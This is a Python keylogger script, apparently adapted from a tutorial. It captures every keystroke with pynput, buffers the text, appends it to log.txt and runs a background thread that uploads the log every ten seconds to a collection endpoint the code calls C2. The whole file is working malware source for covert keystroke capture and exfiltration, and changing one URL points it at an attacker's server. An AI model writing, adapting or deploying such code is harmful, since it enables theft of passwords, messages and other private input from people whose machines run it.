# based almost entirely on : https://rajmehta2012.medium.com/introduction-274b4f4f6724
import threading
import time
import requests
from pynput.keyboard import Key, Listener
import re
from Xlib import X, XK
from Xlib.display import Display

URL = "http://127.0.0.1:8080/collect"
FILENAME = "log.txt"
display = Display()

count = 0
queue_keys = []


def key_to_text(key):
    if key == Key.space:
        return " "

    if key == Key.enter:
        return "\n"

    if hasattr(key, "char") and key.char is not None:
        return key.char

    return ""

def on_press(key):
    # function called when a key is pressed
    global queue_keys, count
    count += 1
    print(count)

    if key == Key.backspace:
        if queue_keys:
            print("Backspace detected, removing last key from queue")
            queue_keys.pop()
        return

    queue_keys.append(key)


    # if it is enter key, then we will write the keys to the file
    if key == Key.enter:
        text = "".join([key_to_text(k) for k in queue_keys])
        print("Writing to file:", text)
        with open(FILENAME, "a") as f:
            f.write(text)

        queue_keys.clear()
        count = 0
        return 
    # if more than 100 keys are pressed, we will write the keys to the file
    if count >= 75:
        text = "".join([key_to_text(k) for k in queue_keys])
        print("Writing to file:", text)
        with open(FILENAME, "a") as f:
            f.write(text)

        queue_keys.clear()
        count = 0
        return
        


def on_release(key):
    if key == Key.esc:
        return False

def send_data():
    while True:
        try:
            with open(FILENAME, "rb") as f:
                response = requests.post(
                    URL,
                    files={"file": (FILENAME, f, "text/plain")},
                    timeout=5
                )

            print("Data sent:", response.status_code)

        except requests.RequestException as e:
            print("C2 unavailable:", e)
        except FileNotFoundError:
            print("Log file not found. Waiting for the first log entry.")
        time.sleep(10)


thread = threading.Thread(target=send_data, daemon=True)
thread.start()


with Listener(on_press=on_press, on_release=on_release) as listener:
    with open(FILENAME, "a") as f:
        f.write("\n\n##############################################NEW SESSION##############################################\n\n")
    listener.join()

